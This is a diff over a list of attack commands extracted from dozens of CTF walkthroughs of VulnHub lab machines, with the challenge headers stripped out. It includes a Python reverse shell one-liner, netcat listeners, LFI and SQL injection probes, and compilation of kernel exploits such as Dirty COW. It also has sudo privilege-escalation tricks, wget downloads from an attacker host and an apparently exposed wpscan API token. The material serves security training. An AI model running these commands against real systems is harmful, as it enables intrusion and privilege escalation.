@@ -1,19 +1,10 @@
-
-
-Challenge Name: the-planets-earth-ctf-walkthrough-part-1
-Challenge URL: https://resources.infosecinstitute.com/topic/the-planets-earth-ctf-walkthrough-part-1/
+Total number of challenges: 913
 
 netdiscover
 nmap -p- -sV 192.168.1.10
 echo “192.168.1.10 terratest.earth.local”
 echo “192.168.1.10 earth.local”
 cat /etc/hosts
-
-
-
-Challenge Name: empire-breakout-vulnhub-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/empire-breakout-vulnhub-ctf-walkthrough/
-
 nmap 192.168.1.11 -p- -sV
 enum4linux -a 192.168.1.11
 enum4linux -a 192.168.1.11
@@ -27,23 +18,11 @@ tar -xf password.tar
 cat .old_pass.bak
 su root
 cat r00t.txt
-
-
-
-Challenge Name: jangow-1-0-1-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/jangow-1-0-1-ctf-walkthrough/
-
 nmap 192.168.1.11 -p- -sV
 nc -lvp 1234
 cat user.txt
 gcc -pthread dirty.c -o dirty -lcrypt
 cat proof.txt
-
-
-
-Challenge Name: finding-my-friend-1-vulnhub-ctf-walkthrough-part-2
-Challenge URL: https://resources.infosecinstitute.com/topic/finding-my-friend-1-vulnhub-ctf-walkthrough-part-2/
-
 ssh john@192.168.1.18
 cat flag2.txt
 cat clue.txt
@@ -65,24 +44,12 @@ cat capture/flag1.txt
 cat honey/flag4.txt
 cat john/flag2.txt
 cat parth/flag3.txt
-
-
-
-Challenge Name: finding-my-friend-1-vulnhub-ctf-walkthrough-part-1
-Challenge URL: https://resources.infosecinstitute.com/topic/finding-my-friend-1-vulnhub-ctf-walkthrough-part-1/
-
 netdiscover
 nmap 192.168.1.10 -p- -sV
 echo “NjMgNjEgNzAgNzQgNzUgNzIgNjUgM2EgNjggNzUgNmUgNzQgNjkgNmUgNjc=” | base64 -d
 ftp 192.168.1.18
 steghide –extract -sf .get.jpg
 steghide –extract -sf .get.jpg
-
-
-
-Challenge Name: hogwarts-dobby-vulnhub-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/hogwarts-dobby-vulnhub-ctf-walkthrough/
-
 netdiscover
 nmap 192.168.1.13 -p- -sV
 set RHOSTS 192.168.1.13
@@ -97,12 +64,6 @@ cat
 su dobby
 less flag1.txt
 tail proof.txt
-
-
-
-Challenge Name: hackathonctf-2-vulnhub-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/hackathonctf-2-vulnhub-ctf-walkthrough/
-
 netdiscover
 nmap -p- -sV 192.168.1.24
 ftp 192.168.1.24
@@ -115,12 +76,6 @@ sudo -l
 sudo /usr/bin/vim
 id
 cat flag2.txt
-
-
-
-Challenge Name: empire-lupinone-vulnhub-ctf-walkthrough-part-2
-Challenge URL: https://resources.infosecinstitute.com/topic/empire-lupinone-vulnhub-ctf-walkthrough-part-2/
-
 john /tmp/hash –wordlist=/usr/share/wordlists/fasttrack.txt
 chmod 600 key
 ssh -i key icex64@192.168.1.15
@@ -134,22 +89,10 @@ find / -type f -prem -ug=rwx 2>/dev/null
 nc -lvp 1234
 sudo -l
 cat root.txt
-
-
-
-Challenge Name: empire-lupinone-vulnhub-ctf-walkthrough-part-1
-Challenge URL: https://resources.infosecinstitute.com/topic/empire-lupinone-vulnhub-ctf-walkthrough-part-1/
-
 nmap 192.168.1.15 -p- -sV
 ffuf -u ‘http://192.168.1.15/~FUZZ’ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -e .php,.txt
 ffuf -u ‘http://192.168.1.15/~secret/.FUZZ’ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -e .php,.txt -fc 403
 cat
-
-
-
-Challenge Name: hogwarts-bellatrix-vulnhub-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/hogwarts-bellatrix-vulnhub-ctf-walkthrough/
-
 netdiscover
 nmap 192.168.1.16 -p- -sV
 nc -lvp 1234
@@ -162,12 +105,6 @@ su lestrange
 sudo -l
 sudo vim -c ‘:!/bin/bash’
 cat root.txt
-
-
-
-Challenge Name: beelzebub-1-vulnhub-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/beelzebub-1-vulnhub-ctf-walkthrough/
-
 netdiscover
 nmap 192.168.1.23 -p- -sV
 echo -n “beelzebub” | md5sum
@@ -181,12 +118,6 @@ gcc exp.c
 chmod +x a.out
 cat user.txt
 cat root.txt
-
-
-
-Challenge Name: corrosion-1-vulnhub-ctf-walkthrough-part-two
-Challenge URL: https://resources.infosecinstitute.com/topic/corrosion-1-vulnhub-ctf-walkthrough-part-two/
-
 nc -lvp 1234
 export TERM=screen
 cat /etc/issue
@@ -205,22 +136,10 @@ gcc infosec.c -o easysysinfo
 sudo /home/randy/tools/easysysinfo
 cd /root
 cat root.txt
-
-
-
-Challenge Name: corrosion-1-vulnhub-ctf-walkthrough-part-one
-Challenge URL: https://resources.infosecinstitute.com/topic/corrosion-1-vulnhub-ctf-walkthrough-part-one/
-
 netdiscover
 nmap 192.168.1.16 -p- -sV
 ffuf -u http://192.168.1.16/blog-post/archives/randylogs.php?FUZZ=/etc/passwd -w /usr/share/wordlists/dirb/small.txt -fs 0
 ssh infosec@192.168.1.16
-
-
-
-Challenge Name: evilbox-one-vulnhub-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/evilbox-one-vulnhub-ctf-walkthrough/
-
 nmap 192.168.1.21 -p- -sV
 ffuf -u ‘http://192.168.1.21/secret/evil.php?FUZZ=/etc/passwd’ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -fs 0
 cat
@@ -239,12 +158,6 @@ cat /etc/passwd
 su infosec
 id
 cat root.txt
-
-
-
-Challenge Name: deathnote-1-vulnhub-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/deathnote-1-vulnhub-ctf-walkthrough/
-
 netdiscover
 nmap 192.168.1.60 -sV -p-
 echo “192.168.1.60 deathnote.vuln”
@@ -261,12 +174,6 @@ su kira
 sudo -l
 sudo su
 cat root.txt
-
-
-
-Challenge Name: money-heist-1-0-1-vulnhub-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/money-heist-1-0-1-vulnhub-ctf-walkthrough/
-
 netdiscover
 nmap -sV -p- 192.168.1.25
 cat jwt.txt
@@ -284,12 +191,6 @@ sudo -l
 cat finalflag.txt
 cat flag2.txt
 cat flag3.txt
-
-
-
-Challenge Name: hackademic-rtb1-vulnhub-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/hackademic-rtb1-vulnhub-ctf-walkthrough/
-
 netdiscover
 nmap -p- -sV 192.168.1.19
 nc -lvp 1234
@@ -299,12 +200,6 @@ mv 15285 15285.c
 gcc 15285.c
 ls
 cat /root/key.txt
-
-
-
-Challenge Name: doubletrouble-1-vulnhub-ctf-walkthrough-part-3
-Challenge URL: https://resources.infosecinstitute.com/topic/doubletrouble-1-vulnhub-ctf-walkthrough-part-3/
-
 cat
 sqlmap -r sql
 sqlmap -r sql –dbs
@@ -316,12 +211,6 @@ cat user.txt
 gcc -pthread exploit.c -o dirty -lcrypt
 su firefart
 cat /root/root.txt
-
-
-
-Challenge Name: doubletrouble-1-vulnhub-ctf-walkthrough-part-2
-Challenge URL: https://resources.infosecinstitute.com/topic/doubletrouble-1-vulnhub-ctf-walkthrough-part-2/
-
 git clone https://github.com/pentestmonkey/php-reverse-shell.git
 vi php-reverse-shell.php
 python 48146.py
@@ -334,22 +223,10 @@ cd /root
 cp doubletrouble.ova /var/www/html/
 cd /var/www/html/
 netdiscover
-
-
-
-Challenge Name: doubletrouble-1-vulnhub-ctf-walkthrough-part-1
-Challenge URL: https://resources.infosecinstitute.com/topic/doubletrouble-1-vulnhub-ctf-walkthrough-part-1/
-
 netdiscover
 nmap 192.168.1.28 -p- -sV
 steghide –extract -sf doubletrouble.jpg
 steghide –extract -sf doubletrouble.jpg
-
-
-
-Challenge Name: looz-1-vulnhub-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/looz-1-vulnhub-ctf-walkthrough/
-
 arp-scan -l
 nmap -sV -p- 192.168.1.21
 echo “192.168.1.21 wp.looz.com”
@@ -360,12 +237,6 @@ uname -a
 sudo -l
 find / -prem -4000 -type f -exec ls -al{} \; 2>/dev/null
 cat /root/root.txt
-
-
-
-Challenge Name: digitalworld-local-fall-vulnhub-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/digitalworld-local-fall-vulnhub-ctf-walkthrough/
-
 nmap -p- -sV 192.168.1.21
 ffuf -r -c -ic -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u ‘http://192.168.1.21/test.php?FUZZ=/etc/passwd’ -fs 80
 chmod 400 key
@@ -378,12 +249,6 @@ cat .bash_history
 su qiu
 sudo -l
 cat proof.txt
-
-
-
-Challenge Name: hacker-kid-1-0-1-vulnhub-ctf-walkthrough-part-2
-Challenge URL: https://resources.infosecinstitute.com/topic/hacker-kid-1-0-1-vulnhub-ctf-walkthrough-part-2/
-
 nc -lvp 1234
 cat /etc/issue
 uname -a
@@ -392,23 +257,11 @@ wget 192.168.1.23:8001/linux-exploit-suggester.sh
 ps -eaf | grep root
 chmod +x inject.py
 nc 192.168.1.12 5600
-
-
-
-Challenge Name: hacker-kid-1-0-1-vulnhub-ctf-walkthrough-part-1
-Challenge URL: https://resources.infosecinstitute.com/topic/hacker-kid-1-0-1-vulnhub-ctf-walkthrough-part-1/
-
 arp-scan -i
 nmap -sV -p- 192.168.1.7
 echo “192.168.1.7 hackers.blackhat.local”
 dig hackers.blackhat.local @192.168.1.7
 echo “192.168.1.7 hackerskid.blackhat.local.”
-
-
-
-Challenge Name: hacksudo-thor-vulnhub-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/hacksudo-thor-vulnhub-ctf-walkthrough/
-
 nmap -p- -sV 192.168.1.24
 msfconsole
 set RHOSTS 192.168.1.24
@@ -423,12 +276,6 @@ sudo -u thor /home/thor/./hammer.sh
 sudo -l
 sudo service ../../bin/bash
 cat proof.txt
-
-
-
-Challenge Name: thoth-tech-1-vulnhub-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/thoth-tech-1-vulnhub-ctf-walkthrough/
-
 netdiscover
 nmap –p- -sV 192.168.1.18
 dirb http://192.168.1.18
@@ -440,12 +287,6 @@ uname -a
 sudo -l
 sudo /usr/bin/find /home/ -exec /bin/bash \;
 id
-
-
-
-Challenge Name: funbox-under-construction-vulnhub-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/funbox-under-construction-vulnhub-ctf-walkthrough/
-
 nmap -sV -p- 192.168.1.26
 mv 44374 44374.py
 chmod +x 44374.py
@@ -460,22 +301,10 @@ cat configure.php.bak
 cat ./usr/share/doc/example/cron.sh
 su root
 cat root.txt
-
-
-
-Challenge Name: hackable-vulnhub-ctf-walkthrough-part-1
-Challenge URL: https://resources.infosecinstitute.com/topic/hackable-vulnhub-ctf-walkthrough-part-1/
-
 nmap -sV -p- 192.168.1.26
 echo “MTAwMDA=” | base64 –decode
 apt-get install steghide -y
 steghide –extract -sf 3.jpg
-
-
-
-Challenge Name: jetty-1-vulnhub-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/jetty-1-vulnhub-ctf-walkthrough/
-
 nmap -p- -sV 192.168.1.24
 ftp 192.168.1.24
 unzip sshpass.zip
@@ -492,23 +321,11 @@ uname -a
 sudo -l
 sudo find . -exec /bin/bash \; -quit
 cat user.txt
-
-
-
-Challenge Name: funbox-scriptkiddie-vulnhub-capture-the-flag-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/funbox-scriptkiddie-vulnhub-capture-the-flag-walkthrough/
-
 nmap -sV -p- 192.168.1.26
 nmap -p21 -sV 192.168.1.21
 msfconsole
 set RHOSTS 192.168.1.21
 set payload cmd/unix/reverse
-
-
-
-Challenge Name: hms-1-vulnhub-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/hms-1-vulnhub-ctf-walkthrough/
-
 fping -aqg 192.168.1.0/24
 nmap -sV -p- 192.168.1.22
 cat
@@ -524,12 +341,6 @@ nc -lvp 3434
 sudo -l
 sudo tar -cf /dev/null /dev/null –checkpoint=1 –checkpoint-action=exec=/bin/bash
 python -c ‘import pty;pty.spawn(“/bin/bash”)’
-
-
-
-Challenge Name: dr4g0n-b4ll-1-vulnhub-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/dr4g0n-b4ll-1-vulnhub-ctf-walkthrough/
-
 netdiscover
 nmap -p- -sV 192.168.1.31
 echo eW91IGZpbmQgdGhlIGhpZGRlbiBkaXI= | base64 –decode
@@ -550,12 +361,6 @@ chmod +x ps
 export PATH=/tmp:$PATH
 which ps
 cat proof.txt
-
-
-
-Challenge Name: pylington-1-vulnhub-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/pylington-1-vulnhub-ctf-walkthrough/
-
 netdiscover
 nmap -sV -p- 192.168.1.25
 nc -lvp 1234
@@ -567,12 +372,6 @@ cat user.txt
 cat backup.cc
 openssl passwd -1 -salt INFOSEC infosec
 su infosec
-
-
-
-Challenge Name: darkhole-1-vulnhub-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/darkhole-1-vulnhub-ctf-walkthrough/
-
 netdiscover
 nmap 192.168.1.14 -sV -p-
 nc -lvp 1234
@@ -591,12 +390,6 @@ echo ‘import os;os.system(“/bin/bash”)’ > file.py
 sudo /user/bin/python3 /home/john/file.py
 id
 cat root.txt
-
-
-
-Challenge Name: r-temis-1-vulnhub-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/r-temis-1-vulnhub-ctf-walkthrough/
-
 netdiscover
 nmap –p- -sV 192.168.1.23
 ssh rtemis@192.168.1.19
@@ -609,12 +402,6 @@ ls -la
 cat .mysql_history
 su
 cat /root/flag2.txt
-
-
-
-Challenge Name: hackable-ii-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/hackable-ii-ctf-walkthrough/
-
 netdiscover
 nmap -p- -sV 192.168.1.24
 ftp 192.168.1.24
@@ -629,12 +416,6 @@ cat user.txt
 sudo -l
 sudo /usr/bin/python3.5 -c ‘import pty;pty.spawn(“/bin/bash”)’
 cat /root/root.txt
-
-
-
-Challenge Name: momentum-1-vulnhub-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/momentum-1-vulnhub-ctf-walkthrough/
-
 nmap -sV -p- 192.168.1.26
 ssh auxerre@192.168.1.14
 cat user.txt
@@ -643,12 +424,6 @@ cat /etc/issue
 ps -aux
 redis-cli
 su
-
-
-
-Challenge Name: nasef1-locating-target-vulnhub-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/nasef1-locating-target-vulnhub-ctf-walkthrough/
-
 netdiscover
 nmap –p- -sV 192.168.1.23
 dirb http://192.168.1.30/
@@ -664,12 +439,6 @@ ls –l /etc/passwd
 vi /etc/passwd
 su
 cat root.txt
-
-
-
-Challenge Name: hacksudo-proximacentauri-vulnhub-ctf-walkthrough-part-2
-Challenge URL: https://resources.infosecinstitute.com/topic/hacksudo-proximacentauri-vulnhub-ctf-walkthrough-part-2/
-
 ssh admin@192.168.1.21
 id
 nc -lvp 1234
@@ -683,12 +452,6 @@ cat user.txt
 find / -perm -4000 -type f -exec ls -al {} \; 2>/dev/null
 getcap -r / 2>/dev/null
 cat /root/root.txt
-
-
-
-Challenge Name: the-planets-mercury-vulnhub-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/the-planets-mercury-vulnhub-ctf-walkthrough/
-
 netdiscover
 nmap -sV -p- 192.168.1.25
 ssh webmaster@192.168.1.15
@@ -702,20 +465,8 @@ ln -s /bin/vi tail
 export PATH=.:$PATH
 sudo –preserve-env=PATH /usr/bin/check_syslog.sh
 cat flag.txt
-
-
-
-Challenge Name: hacksudo-proximacentauri-vulnhub-ctf-walkthrough-part-1
-Challenge URL: https://resources.infosecinstitute.com/topic/hacksudo-proximacentauri-vulnhub-ctf-walkthrough-part-1/
-
 nmap -p- -sV 192.168.1.21
 nmap -p- 192.168.1.21 -v
-
-
-
-Challenge Name: vulncms-1-vulnhub-ctf-walkthrough-part-2
-Challenge URL: https://resources.infosecinstitute.com/topic/vulncms-1-vulnhub-ctf-walkthrough-part-2/
-
 msfconsole
 set RHOSTS 192.168.1.25
 set RPORT 9001
@@ -727,22 +478,10 @@ su tyrell
 sudo -l
 sudo /bin/journalctl
 cat root.txt
-
-
-
-Challenge Name: vulncms-1-vulnhub-ctf-walkthrough-part-1
-Challenge URL: https://resources.infosecinstitute.com/topic/vulncms-1-vulnhub-ctf-walkthrough-part-1/
-
 netdiscover
 nmap -p- -sV 192.168.1.25
 echo “192.168.1.25 society.web”
 apt-get install joomscan
-
-
-
-Challenge Name: ripper-1-vulnhub-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/ripper-1-vulnhub-ctf-walkthrough/
-
 netdiscover
 nmap –p- -sV 192.168.1.23
 netdiscover
@@ -759,12 +498,6 @@ set USERNAME admin
 set SSL true
 id
 cat /root/flag.txt
-
-
-
-Challenge Name: pyexp-1-vulnhub-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/pyexp-1-vulnhub-ctf-walkthrough/
-
 mysql -u root -h 192.168.1.18 -p
 ssh lucy@192.168.1.18
 cat /etc/issue
@@ -775,12 +508,6 @@ ls -l
 nc -lvp 1234
 sudo -u root /usr/bin/python2 /opt/exp.py
 cat /root/root.txt
-
-
-
-Challenge Name: admx-1-0-1-vulnhub-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/admx-1-0-1-vulnhub-ctf-walkthrough/
-
 netdiscover
 msfconsole
 set RHOSTS 192.168.1.29
@@ -794,12 +521,6 @@ cat local.txt
 sudo -l
 sudo /usr/bin/mysql -u root -D wordpress -p
 cat /root/proof.txt
-
-
-
-Challenge Name: colddbox-easy-vulnhub-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/colddbox-easy-vulnhub-ctf-walkthrough/
-
 netdiscover
 nmap -p- -sV 192.168.1.19
 wpscan –url http://192.168.1.19 –api-token ntCJoKnWhw3NzmHKDbqEj5ukJshug44GQrxcRTaXZ14 –plugins-detection aggressive
@@ -816,12 +537,6 @@ sudo -l
 sudo ftp
 id
 cat root.txt
-
-
-
-Challenge Name: hacksudo-vulnhub-ctf-walkthrough-part-1
-Challenge URL: https://resources.infosecinstitute.com/topic/hacksudo-vulnhub-ctf-walkthrough-part-1/
-
 netdiscover
 nmap 192.168.1.19 -sV -p-
 msfconsole
@@ -829,12 +544,6 @@ set RHOSTS 192.168.1.19
 set RPORT 8080
 set HttpPassword tomcat
 set HttpUsername tomcat
-
-
-
-Challenge Name: clover-1-vulnhub-ctf-walkthrough-part-2
-Challenge URL: https://resources.infosecinstitute.com/topic/clover-1-vulnhub-ctf-walkthrough-part-2/
-
 cat requests
 sqlmap -r request
 sqlmap -r request  –dbs
@@ -852,18 +561,6 @@ hydra -l sword -P password ssh://192.168.1.15 -t 4
 cat local2.txt
 find / -type f -perm -ug=rwx 2>/dev/null
 cat /root/proof.txt
-
-
-
-Challenge Name: capture-the-flag-a-walkthrough-of-suncsrs-seppuku
-Challenge URL: https://resources.infosecinstitute.com/topic/capture-the-flag-a-walkthrough-of-suncsrs-seppuku/
-
-
-
-
-Challenge Name: colddworld-immersion-vulnhub-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/colddworld-immersion-vulnhub-ctf-walkthrough/
-
 netdiscover
 nmap 192.168.1.20 -sV -p-
 ssh carls@192.168.1.20 -p3042
@@ -881,12 +578,6 @@ sudo -u root /usr/bin/python3 /home/c0ldd/DoNotRun.py
 id
 cat /root/root.txt
 echo “RmVsaWNpZGFkZXMgY3JhY2s=” | base64 -d
-
-
-
-Challenge Name: moneybox-1-vulnhub-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/moneybox-1-vulnhub-ctf-walkthrough/
-
 netdiscover
 apt-get install steghide -y
 steghide –extract -sf trytofind.jpg
@@ -901,12 +592,6 @@ cat authorized_keys
 sudo -l
 nc -lvp 1234
 cat .root.txt
-
-
-
-Challenge Name: clover-1-vulnhub-ctf-walkthrough-part-1
-Challenge URL: https://resources.infosecinstitute.com/topic/clover-1-vulnhub-ctf-walkthrough-part-1/
-
 netdiscover
 nmap 192.168.1.16 -p- -sV
 cd maintenance
@@ -915,12 +600,6 @@ cat test.txt
 cat test2.txt
 cat locate.txt
 echo cGluZyBwb25n | base64 –decode
-
-
-
-Challenge Name: ganana-1-vulnhub-ctf-walkthrough-part-2
-Challenge URL: https://resources.infosecinstitute.com/topic/ganana-1-vulnhub-ctf-walkthrough-part-2/
-
 cd /
 cd /home
 ls -la
@@ -932,12 +611,6 @@ uname -a
 su Jeevan
 docker run -v /:/mnt –rm -it alpine chroot /mnt sh
 cat /root/root.txt
-
-
-
-Challenge Name: wpwn-1-vulnhub-capture-the-flag-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/wpwn-1-vulnhub-capture-the-flag-walkthrough/
-
 netdiscover
 nmap -sV -p- 192.168.1.25
 cat
@@ -954,12 +627,6 @@ sudo su
 cat /root/root.txt
 find . -name “root” 2>/dev/null
 cat /usr/games/USB/root
-
-
-
-Challenge Name: m87-1-vulnhub-capture-the-flag-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/m87-1-vulnhub-capture-the-flag-walkthrough/
-
 nmap -Pn -p- 192.168.1.21
 cat etc_passwd
 python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.1.22”,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’
@@ -969,12 +636,6 @@ uname -a
 python –version
 id
 cat /root/proof.txt
-
-
-
-Challenge Name: nyx-1-vulnhub-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/nyx-1-vulnhub-ctf-walkthrough/
-
 nmap 192.168.1.26 -p- -sV
 nmap 192.168.1.26 -p 80 –script=http-enum
 cat
@@ -984,21 +645,9 @@ cat /etc/issue
 sudo -l
 sudo gcc –wrapper /bin/sh,-s .
 cat /root/root.txt
-
-
-
-Challenge Name: ganana-1-vulnhub-ctf-walkthrough-part-one
-Challenge URL: https://resources.infosecinstitute.com/topic/ganana-1-vulnhub-ctf-walkthrough-part-one/
-
 netdiscover
 nmap 192.168.1.18 -p- sV
 cat .Note.txt
-
-
-
-Challenge Name: tbbt-funwithflags-vulnhub-ctf-walkthrough-part-1
-Challenge URL: https://resources.infosecinstitute.com/topic/tbbt-funwithflags-vulnhub-ctf-walkthrough-part-1/
-
 nmap -p- -sV 192.168.1.105
 msfconsole
 set rhosts 192.168.1.105
@@ -1009,12 +658,6 @@ cat notes.txt
 ls -l secretdiary
 file secretdiary
 strings secretdiary
-
-
-
-Challenge Name: odin-vulnhub-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/odin-vulnhub-ctf-walkthrough/
-
 netdiscover
 nmap 192.168.1.14 -sV -p-
 echo “192.168.1.13 odin”
@@ -1027,12 +670,6 @@ cat /etc/issue
 cat /var/www/html/wp-config.php
 john pass
 su root
-
-
-
-Challenge Name: funbox-vulnhub-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/funbox-vulnhub-ctf-walkthrough/
-
 netdiscover
 nmap 192.168.1.16 -sV -p-
 cat /etc/issue
@@ -1040,12 +677,6 @@ uname -a
 mv 45010 45010.c
 gcc 45010
 cat /root/flag.txt
-
-
-
-Challenge Name: kira-vulnhub-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/kira-vulnhub-ctf-walkthrough/
-
 netdiscover
 nmap -p- -sV 192.168.1.11
 nc -lvp 1234
@@ -1059,12 +690,6 @@ su assam
 sudo -l
 sudo find . -exec /bin/sh \; -quit
 cat /root/flag.txt
-
-
-
-Challenge Name: y0usef-1-vulnhub-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/y0usef-1-vulnhub-ctf-walkthrough/
-
 netdiscover
 nmap 192.168.1.14 -sV -p-
 ifconfig eth0
@@ -1074,24 +699,12 @@ cat /etc/issue
 cat user.txt
 sudo -l
 cat /root/root.txt
-
-
-
-Challenge Name: tomato-1-vulnhub-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/tomato-1-vulnhub-ctf-walkthrough/
-
 nmap -sV -p- 192.168.1.19
 uname -a
 cat /etc/issue
 mv 45010 45010.c
 gcc 45010.c
 chmod +x a.out
-
-
-
-Challenge Name: cewlkid-vulnhub-ctf-walkthrough-pt-2
-Challenge URL: https://resources.infosecinstitute.com/topic/cewlkid-vulnhub-ctf-walkthrough-pt-2/
-
 ifconfig
 nc -lvp 443
 uname -a
@@ -1110,27 +723,9 @@ sudo -l
 su cewlbeans
 sudo -l
 cat /root/root.txt
-
-
-
-Challenge Name: cewlkid-vulnhub-ctf-walkthrough-pt-1
-Challenge URL: https://resources.infosecinstitute.com/topic/cewlkid-vulnhub-ctf-walkthrough-pt-1/
-
 netdiscover
 nmap 192.168.1.14 -sV -p-
-
-
-
-Challenge Name: hack-the-box-htb-walkthrough-ctf-omni
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-ctf-omni/
-
 nmap -sC -sV -oA Omni 10.10.10.204
-
-
-
-Challenge Name: election-1-vulnhub-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/election-1-vulnhub-ctf-walkthrough/
-
 netdiscover
 cat user.txt
 uname -a
@@ -1141,103 +736,32 @@ gcc 47009.c
 wget 192.168.1.17/bb/a.out
 chmod +x a.out
 cat /root/root.txt
-
-
-
-Challenge Name: presidential-ctf-walkthrough-part-1
-Challenge URL: https://resources.infosecinstitute.com/topic/presidential-ctf-walkthrough-part-1/
-
 netdiscover
 nmap 192.168.1.14 -sV -p-
 echo “192.168.1.22 votenow.local”
 wfuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H “HOST: FUZZ.votenow.local” –hw 854 –hc 400 -t 100 192.168.1.22
 echo “192.168.1.22 datasafe.votenow.local”
-
-
-
-Challenge Name: capture-the-flag-a-walkthrough-of-suncsrs-katana
-Challenge URL: https://resources.infosecinstitute.com/topic/capture-the-flag-a-walkthrough-of-suncsrs-katana/
-
-
-
-
-Challenge Name: so-simple-1-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/so-simple-1-ctf-walkthrough/
-
 nano simple.txt
-
-
-
-Challenge Name: ha-narak-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/ha-narak-ctf-walkthrough/
-
 cat user.txt
-
-
-
-Challenge Name: lazyadmin-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/lazyadmin-ctf-walkthrough/
-
-
-
-
-Challenge Name: photographer-1-vulnhub-ctf-walkthrough-part-2
-Challenge URL: https://resources.infosecinstitute.com/topic/photographer-1-vulnhub-ctf-walkthrough-part-2/
-
-
-
-
-Challenge Name: my-cmsms-1-vulnhub-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/my-cmsms-1-vulnhub-ctf-walkthrough/
-
 nmap -p- -sV 192.168.1.101
 mysql -h 192.168.1.101 -u root -p
-
 ls -la
 cat .htpasswd
 su armour
 sudo -l
-
-
-
-
-Challenge Name: cybersploit-2-vulnhub-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/cybersploit-2-vulnhub-ctf-walkthrough/
-
 cat flag.txt
-
-
-
-Challenge Name: cybersploit-1-vulnhub-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/cybersploit-1-vulnhub-ctf-walkthrough/
-
 nmap 192.168.1.30 -p- -sV
 cat flag2.txt
 cat finalflag.txt
-
-
-
-Challenge Name: photographer-1-ctf-walkthrough-part-1
-Challenge URL: https://resources.infosecinstitute.com/topic/photographer-1-ctf-walkthrough-part-1/
-
 netdiscover
 nmap 192.168.1.26 -p- -sV
 dirb
 smbclient -I 192.168.1.26 -L -N
-
 cat mailsent.txt
 dirb
-
-
-
-Challenge Name: djinn-1-vulnhub-ctf-walkthrough-part-2
-Challenge URL: https://resources.infosecinstitute.com/topic/djinn-1-vulnhub-ctf-walkthrough-part-2/
-
 cat cred.txt
 sudo -l
-
 sudo -u root /root/lago
-
 strings .pyc
 wget 192.168.1.53:9765/.pyc
 file .pyc
@@ -1245,182 +769,33 @@ apt-get install python3
 apt-get install python3-pip
 pip3 install uncompyle6
 sudo /root/lago
-
-
-
-Challenge Name: typo-1-vulnhub-ctf-walkthrough-part-2
-Challenge URL: https://resources.infosecinstitute.com/topic/typo-1-vulnhub-ctf-walkthrough-part-2/
-
 nc -lvp 1234
 find / -type f -perm -u=s 2>/dev/null
 strings /usr/local/bin/apache2-restart
-
-
-
-Challenge Name: typo-vulnhub-ctf-walkthrough-part-1
-Challenge URL: https://resources.infosecinstitute.com/topic/typo-vulnhub-ctf-walkthrough-part-1/
-
 nmap -p- -sV 192.168.1.103
-
-
-
-Challenge Name: source-1-vulnhub-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/source-1-vulnhub-ctf-walkthrough/
-
 netdiscover
 nmap -sV 192.168.1.22
-
 msfconsole
-
-
-
 id
 cat /root/root.txt
-
-
-
-Challenge Name: pwned-1-vulnhub-ctf-walkthrough
-Challenge URL: https://resources.infosecinstitute.com/topic/pwned-1-vulnhub-ctf-walkthrough/
-
